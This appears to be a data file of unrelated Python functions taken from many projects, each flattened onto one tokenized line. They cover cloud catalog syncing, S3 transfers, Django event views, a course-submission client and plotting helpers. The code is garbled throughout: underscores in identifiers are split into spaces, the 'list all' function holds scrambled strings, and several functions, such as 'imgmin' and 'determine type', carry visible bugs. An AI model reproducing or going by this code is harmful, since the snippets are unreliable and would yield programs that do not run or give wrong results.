def cmd init pull from cloud ( args ) : ( lcat , ccat ) = ( args . local catalog , args . cloud catalog ) logging . info ( "[init-pull-from-cloud]: %s => %s" % ( ccat , lcat ) ) if isfile ( lcat ) : args . error ( "[init-pull-from-cloud] The local catalog already exist: %s" % lcat ) if not isfile ( ccat ) : args . error ( "[init-pull-from-cloud] The cloud catalog does not exist: %s" % ccat ) ( lmeta , cmeta ) = ( "%s.lrcloud" % lcat , "%s.lrcloud" % ccat ) if isfile ( lmeta ) : args . error ( "[init-pull-from-cloud] The local meta-data already exist: %s" % lmeta ) if not isfile ( cmeta ) : args . error ( "[init-pull-from-cloud] The cloud meta-data does not exist: %s" % cmeta ) #Let's "lock" the local catalog logging . info ( "Locking local catalog: %s" % ( lcat ) ) if not lock file ( lcat ) : raise Runtime Error ( "The catalog %s is locked!" % lcat ) #Copy base from cloud to local util . copy ( ccat , lcat ) #Apply changesets cloud DAG = Changeset DAG ( ccat ) path = cloud DAG . path ( cloud DAG . root . hash , cloud DAG . leafs [ 0 ] . hash ) util . apply changesets ( args , path , lcat ) # Write meta-data both to local and cloud mfile = Meta File ( lmeta ) utcnow = datetime . utcnow ( ) . strftime ( DATETIME FORMAT ) [ : - 4 ] mfile [ 'catalog' ] [ 'hash' ] = hashsum ( lcat ) mfile [ 'catalog' ] [ 'modification utc' ] = utcnow mfile [ 'catalog' ] [ 'filename' ] = lcat mfile [ 'last push' ] [ 'filename' ] = cloud DAG . leafs [ 0 ] . mfile [ 'changeset' ] [ 'filename' ] mfile [ 'last push' ] [ 'hash' ] = cloud DAG . leafs [ 0 ] . mfile [ 'changeset' ] [ 'hash' ] mfile [ 'last push' ] [ 'modification utc' ] = cloud DAG . leafs [ 0 ] . mfile [ 'changeset' ] [ 'modification utc' ] mfile . flush ( ) #Let's copy Smart Previews if not args . no smart previews : copy smart previews ( lcat , ccat , local2cloud = False ) #Finally, let's unlock the catalog files logging . info ( "Unlocking local catalog: %s" % ( lcat ) ) unlock file ( lcat ) logging . info ( "[init-pull-from-cloud]: Success!" )
def rindex ( mylist : Sequence [ T ] , x : T ) -> int : return len ( mylist ) - mylist [ : : - 1 ] . index ( x ) - 1
def authorize ( self ) : response = self . client . login ( username = self . USERNAME , password = self . PASSWORD ) self . assert True ( response ) self . authed = True
def imgmax ( self ) : if not hasattr ( self , ' imgmax' ) : imgmax = np . max ( self . images [ 0 ] ) for img in self . images : imax = np . max ( img ) if imax > imgmax : imgmax = imax self . imgmax = imgmax return self . imgmax
def imgmin ( self ) : if not hasattr ( self , ' imgmin' ) : imgmin = np . min ( self . images [ 0 ] ) for img in self . images : imin = np . min ( img ) if imin > imgmin : imgmin = imin self . imgmin = imgmin return np . min ( self . image )
def usage ( prog name = os . path . basename ( sys . argv [ 0 ] ) ) : spacer = ' ' * len ( 'usage: ' ) usage = prog name + ' -b LIST [-S SEPARATOR] [file ...]\n' + spacer + prog name + ' -c LIST [-S SEPERATOR] [file ...]\n' + spacer + prog name + ' -f LIST [-d DELIM] [-e] [-S SEPERATOR] [-s] [file ...]' # Return usage message with trailing whitespace removed. return "usage: " + usage . rstrip ( )
def parse args ( args ) : # parser uses custom usage string, with 'usage: ' removed, as it is # added automatically via argparser. parser = argparse . Argument Parser ( description = "Remove and/or rearrange " + "sections from each line of a file(s)." , usage = usage ( ) [ len ( 'usage: ' ) : ] ) parser . add argument ( '-b' , "--bytes" , action = 'store' , type = lst , default = [ ] , help = "Bytes to select" ) parser . add argument ( '-c' , "--chars" , action = 'store' , type = lst , default = [ ] , help = "Character to select" ) parser . add argument ( '-f' , "--fields" , action = 'store' , type = lst , default = [ ] , help = "Fields to select" ) parser . add argument ( '-d' , "--delimiter" , action = 'store' , default = "\t" , help = "Sets field delimiter(default is TAB)" ) parser . add argument ( '-e' , "--regex" , action = 'store true' , help = 'Enable regular expressions to be used as input ' + 'delimiter' ) parser . add argument ( '-s' , '--skip' , action = 'store true' , help = "Skip lines that do not contain input delimiter." ) parser . add argument ( '-S' , "--separator" , action = 'store' , default = "\t" , help = "Sets field separator for output." ) parser . add argument ( 'file' , nargs = '*' , default = "-" , help = "File(s) to cut" ) return parser . parse args ( args )
def open s3 ( bucket ) : conn = boto . connect s3 ( options . paved . s3 . access id , options . paved . s3 . secret ) try : bucket = conn . get bucket ( bucket ) except boto . exception . S3Response Error : bucket = conn . create bucket ( bucket ) return bucket
def upload s3 ( file path , bucket name , file key , force = False , acl = 'private' ) : file path = path ( file path ) bucket = open s3 ( bucket name ) if file path . isdir ( ) : # Upload the contents of the dir path. paths = file path . listdir ( ) paths keys = list ( zip ( paths , [ '%s/%s' % ( file key , p . name ) for p in paths ] ) ) else : # Upload just the given file path. paths keys = [ ( file path , file key ) ] for p , k in paths keys : headers = { } s3 key = bucket . get key ( k ) if not s3 key : from boto . s3 . key import Key s3 key = Key ( bucket , k ) content type = mimetypes . guess type ( p ) [ 0 ] if content type : headers [ 'Content-Type' ] = content type file size = p . stat ( ) . st size file data = p . bytes ( ) file md5 , file md5 64 = s3 key . get md5 from hexdigest ( hashlib . md5 ( file data ) . hexdigest ( ) ) # Check the hash. if s3 key . etag : s3 md5 = s3 key . etag . replace ( '"' , '' ) if s3 md5 == file md5 : info ( 'Hash is the same. Skipping %s' % file path ) continue elif not force : # Check if file on S3 is older than local file. s3 datetime = datetime . datetime ( * time . strptime ( s3 key . last modified , '%a, %d %b %Y %H:%M:%S %Z' ) [ 0 : 6 ] ) local datetime = datetime . datetime . utcfromtimestamp ( p . stat ( ) . st mtime ) if local datetime < s3 datetime : info ( "File %s hasn't been modified since last " "being uploaded" % ( file key ) ) continue # File is newer, let's process and upload info ( "Uploading %s..." % ( file key ) ) try : s3 key . set contents from string ( file data , headers , policy = acl , replace = True , md5 = ( file md5 , file md5 64 ) ) except Exception as e : error ( "Failed: %s" % e ) raise
def download s3 ( bucket name , file key , file path , force = False ) : file path = path ( file path ) bucket = open s3 ( bucket name ) file dir = file path . dirname ( ) file dir . makedirs ( ) s3 key = bucket . get key ( file key ) if file path . exists ( ) : file data = file path . bytes ( ) file md5 , file md5 64 = s3 key . get md5 from hexdigest ( hashlib . md5 ( file data ) . hexdigest ( ) ) # Check the hash. try : s3 md5 = s3 key . etag . replace ( '"' , '' ) except Key Error : pass else : if s3 md5 == file md5 : info ( 'Hash is the same. Skipping %s' % file path ) return elif not force : # Check if file on S3 is older than local file. s3 datetime = datetime . datetime ( * time . strptime ( s3 key . last modified , '%a, %d %b %Y %H:%M:%S %Z' ) [ 0 : 6 ] ) local datetime = datetime . datetime . utcfromtimestamp ( file path . stat ( ) . st mtime ) if s3 datetime < local datetime : info ( "File at %s is less recent than the local version." % ( file key ) ) return # If it is newer, let's process and upload info ( "Downloading %s..." % ( file key ) ) try : with open ( file path , 'w' ) as fo : s3 key . get contents to file ( fo ) except Exception as e : error ( "Failed: %s" % e ) raise
def create ical ( request , slug ) : event = get object or 404 ( Event , slug = slug ) # convert dates to datetimes. # when we change code to datetimes, we won't have to do this. start = event . start date start = datetime . datetime ( start . year , start . month , start . day ) if event . end date : end = event . end date end = datetime . datetime ( end . year , end . month , end . day ) else : end = start cal = card me . i Calendar ( ) cal . add ( 'method' ) . value = 'PUBLISH' vevent = cal . add ( 'vevent' ) vevent . add ( 'dtstart' ) . value = start vevent . add ( 'dtend' ) . value = end vevent . add ( 'dtstamp' ) . value = datetime . datetime . now ( ) vevent . add ( 'summary' ) . value = event . name response = Http Response ( cal . serialize ( ) , content type = 'text/calendar' ) response [ 'Filename' ] = 'filename.ics' response [ 'Content-Disposition' ] = 'attachment; filename=filename.ics' return response
def video list ( request , slug ) : event = get object or 404 ( Event , slug = slug ) return render ( request , 'video/video list.html' , { 'event' : event , 'video list' : event . eventvideo set . all ( ) } )
def add event ( request ) : form = Add Event Form ( request . POST or None ) if form . is valid ( ) : instance = form . save ( commit = False ) instance . sites = settings . SITE ID instance . submitted by = request . user instance . approved = True instance . slug = slugify ( instance . name ) instance . save ( ) messages . success ( request , 'Your event has been added.' ) return Http Response Redirect ( reverse ( 'events index' ) ) return render ( request , 'happenings/event form.html' , { 'form' : form , 'form title' : 'Add an event' } )
def add memory ( request , slug ) : event = get object or 404 ( Event , slug = slug ) form = Memory Form ( request . POST or None , request . FILES or None ) if form . is valid ( ) : instance = form . save ( commit = False ) instance . user = request . user instance . event = event instance . save ( ) msg = "Your thoughts were added. " if request . FILES : photo list = request . FILES . getlist ( 'photos' ) photo count = len ( photo list ) for upload file in photo list : process upload ( upload file , instance , form , event , request ) if photo count > 1 : msg += "{} images were added and should appear soon." . format ( photo count ) else : msg += "{} image was added and should appear soon." . format ( photo count ) messages . success ( request , msg ) return Http Response Redirect ( '../' ) return render ( request , 'happenings/add memories.html' , { 'form' : form , 'event' : event } )
def register library ( self , module name : str , attr : str , fallback : str = None ) : # Import the module Named in the string try : module = importlib . import module ( module name ) # If module is not found it checks if an alternative is is listed # If it is then it substitutes it, just so that the code can run except Import Error : if fallback is not None : module = importlib . import module ( fallback ) self . logger . warn ( module name + " not available: Replaced with " + fallback ) else : self . logger . warn ( module name + " not available: No Replacement Specified" ) # Cram the module into the  sketch in the form of module -> "attr" # AKA the same as `import module as attr` if not attr in dir ( self . sketch ) : setattr ( self . sketch , attr , module ) else : self . logger . warn ( attr + " could not be imported as it's label is already used in the sketch" )
def copy ( src , dst ) : ( szip , dzip ) = ( src . endswith ( ".zip" ) , dst . endswith ( ".zip" ) ) logging . info ( "Copy: %s => %s" % ( src , dst ) ) if szip and dzip : #If both zipped, we can simply use copy shutil . copy2 ( src , dst ) elif szip : with zipfile . Zip File ( src , mode = 'r' ) as z : tmpdir = tempfile . mkdtemp ( ) try : z . extractall ( tmpdir ) if len ( z . namelist ( ) ) != 1 : raise Runtime Error ( "The zip file '%s' should only have one " "compressed file" % src ) tmpfile = join ( tmpdir , z . namelist ( ) [ 0 ] ) try : os . remove ( dst ) except OS Error : pass shutil . move ( tmpfile , dst ) finally : shutil . rmtree ( tmpdir , ignore errors = True ) elif dzip : with zipfile . Zip File ( dst , mode = 'w' , compression = ZIP DEFLATED ) as z : z . write ( src , arcname = basename ( src ) ) else : #None of them are zipped shutil . copy2 ( src , dst )
def apply changesets ( args , changesets , catalog ) : tmpdir = tempfile . mkdtemp ( ) tmp patch = join ( tmpdir , "tmp.patch" ) tmp lcat = join ( tmpdir , "tmp.lcat" ) for node in changesets : remove ( tmp patch ) copy ( node . mfile [ 'changeset' ] [ 'filename' ] , tmp patch ) logging . info ( "mv %s %s" % ( catalog , tmp lcat ) ) shutil . move ( catalog , tmp lcat ) cmd = args . patch cmd . replace ( "$in1" , tmp lcat ) . replace ( "$patch" , tmp patch ) . replace ( "$out" , catalog ) logging . info ( "Patch: %s" % cmd ) subprocess . check call ( cmd , shell = True ) shutil . rmtree ( tmpdir , ignore errors = True )
def clean ( self ) : cleaned = super ( Event Form , self ) . clean ( ) if Event . objects . filter ( name = cleaned [ 'name' ] , start date = cleaned [ 'start date' ] ) . count ( ) : raise forms . Validation Error ( u'This event appears to be in the database already.' ) return cleaned
def loop ( self ) : while True : try : with uncaught greenlet exception context ( ) : self . loop callback ( ) except gevent . Greenlet Exit : break if self . stop event . wait ( self . interval ) : break self . clear ( )
def start ( self ) : assert not self . has started ( ) , "called start() on an active Gevent Loop" self . stop event = Event ( ) # note that we don't use safe greenlets.spawn because we take care of it in  loop by ourselves self . greenlet = gevent . spawn ( self . loop )
def kill ( self ) : assert self . has started ( ) , "called kill() on a non-active Gevent Loop" self . stop event . set ( ) self . greenlet . kill ( ) self . clear ( )
def hyphens to dashes ( self ) : problematic hyphens = [ ( r'-([.,!)])' , r'---\1' ) , ( r'(?<=\d)-(?=\d)' , '--' ) , ( r'(?<=\s)-(?=\s)' , '---' ) ] for problem case in problematic hyphens : self . regex replacement ( * problem case )
def str replacement ( self , target , replacement ) : self . data = self . data . replace ( target , replacement )
def regex replacement ( self , target , replacement ) : match = re . compile ( target ) self . data = match . sub ( replacement , self . data )
def showhtml ( ) : import webbrowser # copy from paver opts = options docroot = path ( opts . get ( 'docroot' , 'docs' ) ) if not docroot . exists ( ) : raise Build Failure ( "Sphinx documentation root (%s) does not exist." % docroot ) builddir = docroot / opts . get ( "builddir" , ".build" ) # end of copy builddir = builddir / 'html' if not builddir . exists ( ) : raise Build Failure ( "Sphinx build directory (%s) does not exist." % builddir ) webbrowser . open ( builddir / 'index.html' )
def start again ( self , message = None ) : logging . debug ( "Start again message delivered: {}" . format ( message ) ) the answer = self . game . answer str return "{0} The correct answer was {1}. Please start a new game." . format ( message , the answer )
def minify ( self , css ) : css = css . replace ( "\r\n" , "\n" ) # get rid of Windows line endings, if they exist for rule in REPLACERS [ self . level ] : css = re . compile ( rule [ 0 ] , re . MULTILINE | re . UNICODE | re . DOTALL ) . sub ( rule [ 1 ] , css ) return css
def get or create index ( self , index ratio , index width ) : if not self . index path . exists ( ) or not self . filepath . stat ( ) . st mtime == self . index path . stat ( ) . st mtime : create index ( self . filepath , self . index path , index ratio = index ratio , index width = index width ) return Index File ( str ( self . index path ) )
def create ( self , server ) : for chunk in self . cut to size ( ) : server . post ( 'tasks admin' , chunk . as payload ( ) , replacements = { 'slug' : chunk . challenge . slug } )
def update ( self , server ) : for chunk in self . cut to size ( ) : server . put ( 'tasks admin' , chunk . as payload ( ) , replacements = { 'slug' : chunk . challenge . slug } )
def reconcile ( self , server ) : if not self . challenge . exists ( server ) : raise Exception ( 'Challenge does not exist on server' ) existing = Map Roulette Task Collection . from server ( server , self . challenge ) same = [ ] new = [ ] changed = [ ] deleted = [ ] # reconcile the new tasks with the existing tasks: for task in self . tasks : # if the task exists on the server... if task . identifier in [ existing task . identifier for existing task in existing . tasks ] : # and they are equal... if task == existing . get by identifier ( task . identifier ) : # add to 'same' list same . append ( task ) # if they are not equal, add to 'changed' list else : changed . append ( task ) # if the task does not exist on the server, add to 'new' list else : new . append ( task ) # next, check for tasks on the server that don't exist in the new collection... for task in existing . tasks : if task . identifier not in [ task . identifier for task in self . tasks ] : # ... and add those to the 'deleted' list. deleted . append ( task ) # update the server with new, changed, and deleted tasks if new : new Collection = Map Roulette Task Collection ( self . challenge , tasks = new ) new Collection . create ( server ) if changed : changed Collection = Map Roulette Task Collection ( self . challenge , tasks = changed ) changed Collection . update ( server ) if deleted : deleted Collection = Map Roulette Task Collection ( self . challenge , tasks = deleted ) for task in deleted Collection . tasks : task . status = 'deleted' deleted Collection . update ( server ) # return same, new, changed and deleted tasks return { 'same' : same , 'new' : new , 'changed' : changed , 'deleted' : deleted }
def yn prompt ( msg , default = True ) : ret = custom prompt ( msg , [ "y" , "n" ] , "y" if default else "n" ) if ret == "y" : return True return False
def custom prompt ( msg , options , default ) : formatted options = [ x . upper ( ) if x == default else x . lower ( ) for x in options ] sure = input ( "{0} [{1}]: " . format ( msg , "/" . join ( formatted options ) ) ) if len ( sure ) == 0 : return default for option in options : if sure . upper ( ) == option . upper ( ) : return option return default
def read ( args ) : if args . config file is None or not isfile ( args . config file ) : return logging . info ( "Reading configure file: %s" % args . config file ) config = cparser . Config Parser ( ) config . read ( args . config file ) if not config . has section ( 'lrcloud' ) : raise Runtime Error ( "Configure file has no [lrcloud] section!" ) for ( name , value ) in config . items ( 'lrcloud' ) : if value == "True" : value = True elif value == "False" : value = False if getattr ( args , name ) is None : setattr ( args , name , value )
def write ( args ) : logging . info ( "Writing configure file: %s" % args . config file ) if args . config file is None : return #Let's add each attribute of 'args' to the configure file config = cparser . Config Parser ( ) config . add section ( "lrcloud" ) for p in [ x for x in dir ( args ) if not x . startswith ( " " ) ] : if p in IGNORE ARGS : continue #We ignore some attributes value = getattr ( args , p ) if value is not None : config . set ( 'lrcloud' , p , str ( value ) ) with open ( args . config file , 'w' ) as f : config . write ( f )
def clone ( self ) : t = Tag ( self . version . major , self . version . minor , self . version . patch ) if self . revision is not None : t . revision = self . revision . clone ( ) return t
def with revision ( self , label , number ) : t = self . clone ( ) t . revision = Revision ( label , number ) return t
def parse ( s ) : try : m = regex . match ( s ) t = Tag ( int ( m . group ( 'major' ) ) , int ( m . group ( 'minor' ) ) , int ( m . group ( 'patch' ) ) ) return t if m . group ( 'label' ) is None else t . with revision ( m . group ( 'label' ) , int ( m . group ( 'number' ) ) ) except Attribute Error : return None
def tile ( ) : figs = plt . get fignums ( ) # Keep track of x, y, size for figures x = 0 y = 0 # maxy    = 0 toppad = 21 size = np . array ( [ 0 , 0 ] ) if ( len ( figs ) != 0 ) : fig = plt . figure ( figs [ 0 ] ) screen = fig . canvas . window . get screen ( ) screenx = screen . get monitor geometry ( screen . get primary monitor ( ) ) screenx = screenx [ 2 ] fig = plt . figure ( figs [ 0 ] ) fig . canvas . manager . window . move ( x , y ) maxy = np . array ( fig . canvas . manager . window . get position ( ) ) [ 1 ] size = np . array ( fig . canvas . manager . window . get size ( ) ) y = maxy x += size [ 0 ] + 1 for fig in figs [ 1 : ] : fig = plt . figure ( fig ) size = np . array ( fig . canvas . manager . window . get size ( ) ) if ( x + size [ 0 ] > screenx ) : x = 0 y = maxy maxy = y + size [ 1 ] + toppad else : maxy = max ( maxy , y + size [ 1 ] + toppad ) fig . canvas . manager . window . move ( x , y ) x += size [ 0 ] + 1
def update time ( sender , * * kwargs ) : comment = kwargs [ 'instance' ] if comment . content type . app label == "happenings" and comment . content type . name == "Update" : from . models import Update item = Update . objects . get ( id = comment . object pk ) item . save ( )
def start again ( self , message = None ) : logging . debug ( "Start again message delivered: {}" . format ( message ) ) the answer = self . get text answer ( ) return "{0} The correct answer was {1}. Please start a new game." . format ( message , the answer )
def create ( self , server ) : return server . post ( 'challenge admin' , self . as payload ( ) , replacements = { 'slug' : self . slug } )
def update ( self , server ) : return server . put ( 'challenge admin' , self . as payload ( ) , replacements = { 'slug' : self . slug } )
def exists ( self , server ) : try : server . get ( 'challenge' , replacements = { 'slug' : self . slug } ) except Exception : return False return True
def axesfontsize ( ax , fontsize ) : items = ( [ ax . title , ax . xaxis . label , ax . yaxis . label ] + ax . get xticklabels ( ) + ax . get yticklabels ( ) ) for item in items : item . set fontsize ( fontsize )
def less labels ( ax , x fraction = 0.5 , y fraction = 0.5 ) : nbins = np . size ( ax . get xticklabels ( ) ) ax . locator params ( nbins = np . floor ( nbins * x fraction ) , axis = 'x' ) nbins = np . size ( ax . get yticklabels ( ) ) ax . locator params ( nbins = np . floor ( nbins * y fraction ) , axis = 'y' )
def send zip ( self , exercise , file , params ) : resp = self . post ( exercise . return url , params = params , files = { "submission[file]" : ( 'submission.zip' , file ) } , data = { "commit" : "Submit" } ) return self . to json ( resp )
def ancestors ( self ) : ancestors = set ( [ ] ) self . depth ascend ( self , ancestors ) try : ancestors . remove ( self ) except Key Error : # we weren't ancestor of ourself, that's ok pass return list ( ancestors )
def descendents ( self ) : visited = set ( [ ] ) self . depth descend ( self , visited ) try : visited . remove ( self ) except Key Error : # we weren't descendent of ourself, that's ok pass return list ( visited )
def chisq red ( self ) : if self . chisq red is None : self . chisq red = chisquare ( self . y unweighted . transpose ( ) , np . dot ( self . X unweighted , self . beta ) , self . y error , ddof = 3 , verbose = False ) return self . chisq red
def create ( self , server ) : if len ( self . geometries ) == 0 : raise Exception ( 'no geometries' ) return server . post ( 'task admin' , self . as payload ( ) , replacements = { 'slug' : self . challenge . slug , 'identifier' : self . identifier } )
def update ( self , server ) : return server . put ( 'task admin' , self . as payload ( ) , replacements = { 'slug' : self . challenge . slug , 'identifier' : self . identifier } )
def from server ( cls , server , slug , identifier ) : task = server . get ( 'task' , replacements = { 'slug' : slug , 'identifier' : identifier } ) return cls ( * * task )
def formatter ( color , s ) : if no coloring : return s return "{begin}{s}{reset}" . format ( begin = color , s = s , reset = Colors . RESET )
def set Virtual Env ( ) : try : activate = options . virtualenv . activate cmd except Attribute Error : activate = None if activate is None : virtualenv = path ( os . environ . get ( 'VIRTUAL ENV' , '' ) ) if not virtualenv : virtualenv = options . paved . cwd else : virtualenv = path ( virtualenv ) activate = virtualenv / 'bin' / 'activate' if activate . exists ( ) : info ( 'Using default virtualenv at %s' % activate ) options . setdotted ( 'virtualenv.activate cmd' , 'source %s' % activate )
def pip install ( * args ) : download cache = ( '--download-cache=%s ' % options . paved . pip . download cache ) if options . paved . pip . download cache else '' shv ( 'pip install %s%s' % ( download cache , ' ' . join ( args ) ) )
def put resource ( self , url , body ) : headers = { "Content-Type" : "application/json" , "Accept" : "application/json" } if self . token : headers [ "W-Token" ] = "%s" % self . token response = When I Work DAO ( ) . put URL ( url , headers , json . dumps ( body ) ) if not ( response . status == 200 or response . status == 201 or response . status == 204 ) : raise Data Failure Exception ( url , response . status , response . data ) return json . loads ( response . data )
def post resource ( self , url , body ) : headers = { "Content-Type" : "application/json" , "Accept" : "application/json" } if self . token : headers [ "W-Token" ] = "%s" % self . token response = When I Work DAO ( ) . post URL ( url , headers , json . dumps ( body ) ) if not ( response . status == 200 or response . status == 204 ) : raise Data Failure Exception ( url , response . status , response . data ) return json . loads ( response . data )
def delete resource ( self , url ) : headers = { "Content-Type" : "application/json" , "Accept" : "application/json" } if self . token : headers [ "W-Token" ] = "%s" % self . token response = When I Work DAO ( ) . delete URL ( url , headers ) if not ( response . status == 200 or response . status == 201 or response . status == 204 ) : raise Data Failure Exception ( url , response . status , response . data ) return json . loads ( response . data )
def all comments ( self ) : ctype = Content Type . objects . get ( app label exact = "happenings" , model exact = 'event' ) update ctype = Content Type . objects . get ( app label exact = "happenings" , model exact = 'update' ) update ids = self . update set . values list ( 'id' , flat = True ) return Comment . objects . filter ( Q ( content type = ctype . id , object pk = self . id ) | Q ( content type = update ctype . id , object pk in = update ids ) )
def get all images ( self ) : self imgs = self . image set . all ( ) update ids = self . update set . values list ( 'id' , flat = True ) u images = Update Image . objects . filter ( update id in = update ids ) return list ( chain ( self imgs , u images ) )
def get all images count ( self ) : self imgs = self . image set . count ( ) update ids = self . update set . values list ( 'id' , flat = True ) u images = Update Image . objects . filter ( update id in = update ids ) . count ( ) count = self imgs + u images return count
def repack ( self ) : items = self . grouped filter ( ) . order by ( 'rank' ) . select for update ( ) for count , item in enumerate ( items ) : item . rank = count + 1 item . save ( rerank = False )
def selected course ( func ) : @ wraps ( func ) def inner ( * args , * * kwargs ) : course = Course . get selected ( ) return func ( course , * args , * * kwargs ) return inner
def selected exercise ( func ) : @ wraps ( func ) def inner ( * args , * * kwargs ) : exercise = Exercise . get selected ( ) return func ( exercise , * args , * * kwargs ) return inner
def false exit ( func ) : @ wraps ( func ) def inner ( * args , * * kwargs ) : ret = func ( * args , * * kwargs ) if ret is False : if "TMC TESTING" in os . environ : raise TMC Exit ( ) else : sys . exit ( - 1 ) return ret return inner
def configure ( server = None , username = None , password = None , tid = None , auto = False ) : if not server and not username and not password and not tid : if Config . has ( ) : if not yn prompt ( "Override old configuration" , False ) : return False reset db ( ) if not server : while True : server = input ( "Server url [https://tmc.mooc.fi/mooc/]: " ) . strip ( ) if len ( server ) == 0 : server = "https://tmc.mooc.fi/mooc/" if not server . endswith ( '/' ) : server += '/' if not ( server . startswith ( "http://" ) or server . startswith ( "https://" ) ) : ret = custom prompt ( "Server should start with http:// or https://\n" + "R: Retry, H: Assume http://, S: Assume https://" , [ "r" , "h" , "s" ] , "r" ) if ret == "r" : continue # Strip previous schema if "://" in server : server = server . split ( "://" ) [ 1 ] if ret == "h" : server = "http://" + server elif ret == "s" : server = "https://" + server break print ( "Using URL: '{0}'" . format ( server ) ) while True : if not username : username = input ( "Username: " ) if not password : password = getpass ( "Password: " ) # wow, such security token = b64encode ( bytes ( "{0}:{1}" . format ( username , password ) , encoding = 'utf-8' ) ) . decode ( "utf-8" ) try : api . configure ( url = server , token = token , test = True ) except API Error as e : print ( e ) if auto is False and yn prompt ( "Retry authentication" ) : username = password = None continue return False break if tid : select ( course = True , tid = tid , auto = auto ) else : select ( course = True )
def download ( course , tid = None , dl all = False , force = False , upgradejava = False , update = False ) : def dl ( id ) : download exercise ( Exercise . get ( Exercise . tid == id ) , force = force , update java = upgradejava , update = update ) if dl all : for exercise in list ( course . exercises ) : dl ( exercise . tid ) elif tid is not None : dl ( int ( tid ) ) else : for exercise in list ( course . exercises ) : if not exercise . is completed : dl ( exercise . tid ) else : exercise . update downloaded ( )
def skip ( course , num = 1 ) : sel = None try : sel = Exercise . get selected ( ) if sel . course . tid != course . tid : sel = None except No Exercise Selected : pass if sel is None : sel = course . exercises . first ( ) else : try : sel = Exercise . get ( Exercise . id == sel . id + num ) except peewee . Does Not Exist : print ( "There are no more exercises in this course." ) return False sel . set select ( ) list all ( single = sel )
def run ( exercise , command ) : Popen ( [ 'nohup' , command , exercise . path ( ) ] , stdout = DEVNULL , stderr = DEVNULL )
def select ( course = False , tid = None , auto = False ) : if course : update ( course = True ) course = None try : course = Course . get selected ( ) except No Course Selected : pass ret = { } if not tid : ret = Menu . launch ( "Select a course" , Course . select ( ) . execute ( ) , course ) else : ret [ "item" ] = Course . get ( Course . tid == tid ) if "item" in ret : ret [ "item" ] . set select ( ) update ( ) if ret [ "item" ] . path == "" : select a path ( auto = auto ) # Selects the first exercise in this course skip ( ) return else : print ( "You can select the course with `tmc select --course`" ) return else : selected = None try : selected = Exercise . get selected ( ) except No Exercise Selected : pass ret = { } if not tid : ret = Menu . launch ( "Select an exercise" , Course . get selected ( ) . exercises , selected ) else : ret [ "item" ] = Exercise . byid ( tid ) if "item" in ret : ret [ "item" ] . set select ( ) print ( "Selected {}" . format ( ret [ "item" ] ) )
def submit ( course , tid = None , pastebin = False , review = False ) : if tid is not None : return submit exercise ( Exercise . byid ( tid ) , pastebin = pastebin , request review = review ) else : sel = Exercise . get selected ( ) if not sel : raise No Exercise Selected ( ) return submit exercise ( sel , pastebin = pastebin , request review = review )
def paste ( tid = None , review = False ) : submit ( pastebin = True , tid = tid , review = False )
def list all ( course , single = None ) : def bs ( val ) : return "" i  v l e se " " def bc ( val ) : return as success ( "")  i  v l e se a error("  ") def format line ( exercise ) : return "{0}  {1}  {2}  {3}  {4}".format( e xercis e .tid, bs ( exercise . is selected ) , bc ( exercise . is downloaded ) , bc ( exercise . is completed ) , exercise . menuname ( ) ) print ( "ID{0} S  D  C  Name".format( ( len ( str ( course . exercises [ 0 ] . tid ) ) - 1 ) * " " ) ) if single : print ( format line ( single ) ) return for exercise in course . exercises : # To Do: use a pager print ( format line ( exercise ) )
def update ( course = False ) : if course : with Spinner . context ( msg = "Updated course metadata." , waitmsg = "Updating course metadata." ) : for course in api . get courses ( ) : old = None try : old = Course . get ( Course . tid == course [ "id" ] ) except peewee . Does Not Exist : old = None if old : old . details url = course [ "details url" ] old . save ( ) continue Course . create ( tid = course [ "id" ] , name = course [ "name" ] , details url = course [ "details url" ] ) else : selected = Course . get selected ( ) # with Spinner.context(msg="Updated exercise metadata.", #                     waitmsg="Updating exercise metadata."): print ( "Updating exercise data." ) for exercise in api . get exercises ( selected ) : old = None try : old = Exercise . byid ( exercise [ "id" ] ) except peewee . Does Not Exist : old = None if old is not None : old . name = exercise [ "name" ] old . course = selected . id old . is attempted = exercise [ "attempted" ] old . is completed = exercise [ "completed" ] old . deadline = exercise . get ( "deadline" ) old . is downloaded = os . path . isdir ( old . path ( ) ) old . return url = exercise [ "return url" ] old . zip url = exercise [ "zip url" ] old . submissions url = exercise [ "exercise submissions url" ] old . save ( ) download exercise ( old , update = True ) else : ex = Exercise . create ( tid = exercise [ "id" ] , name = exercise [ "name" ] , course = selected . id , is attempted = exercise [ "attempted" ] , is completed = exercise [ "completed" ] , deadline = exercise . get ( "deadline" ) , return url = exercise [ "return url" ] , zip url = exercise [ "zip url" ] , submissions url = exercise [ ( "exercise " "submissions " "url" ) ] ) ex . is downloaded = os . path . isdir ( ex . path ( ) ) ex . save ( )
def determine type ( x ) : types = ( int , float , str ) type = filter ( lambda a : is type ( a , x ) , types ) [ 0 ] return type ( x )
def dmap ( fn , record ) : values = ( fn ( v ) for k , v in record . items ( ) ) return dict ( itertools . izip ( record , values ) )
def apply types ( use types , guess type , line ) : new line = { } for k , v in line . items ( ) : if use types . has key ( k ) : new line [ k ] = force type ( use types [ k ] , v ) elif guess type : new line [ k ] = determine type ( v ) else : new line [ k ] = v return new line
def format to csv ( filename , skiprows = 0 , delimiter = "" ) : if not delimiter : delimiter = "\t" input file = open ( filename , "r" ) if skiprows : [ input file . readline ( ) for in range ( skiprows ) ] new filename = os . path . splitext ( filename ) [ 0 ] + ".csv" output file = open ( new filename , "w" ) header = input file . readline ( ) . split ( ) reader = csv . Dict Reader ( input file , fieldnames = header , delimiter = delimiter ) writer = csv . Dict Writer ( output file , fieldnames = header , delimiter = "," ) # Write header writer . writerow ( dict ( ( x , x ) for x in header ) ) # Write rows for line in reader : if None in line : del line [ None ] writer . writerow ( line ) input file . close ( ) output file . close ( ) print "Saved %s." % new filename
def sigma prime ( self ) : return np . sqrt ( self . emit / self . beta ( self . E ) )
def n p ( self ) : return 2 * sltr . Ge V2joule ( self . E ) * spc . epsilon 0 / ( self . beta * spc . elementary charge ) ** 2
def main ( target , label ) : check environment ( target , label ) click . secho ( 'Fetching tags from the upstream ...' ) handler = Tag Handler ( git . list tags ( ) ) print information ( handler , label ) tag = handler . yield tag ( target , label ) confirm ( tag )
def check environment ( target , label ) : if not git . exists ( ) : click . secho ( 'You must have git installed to use yld.' , fg = 'red' ) sys . exit ( 1 ) if not os . path . isdir ( '.git' ) : click . secho ( 'You must cd into a git repository to use yld.' , fg = 'red' ) sys . exit ( 1 ) if not git . is committed ( ) : click . secho ( 'You must commit or stash your work before proceeding.' , fg = 'red' ) sys . exit ( 1 ) if target is None and label is None : click . secho ( 'You must specify either a target or a label.' , fg = 'red' ) sys . exit ( 1 )
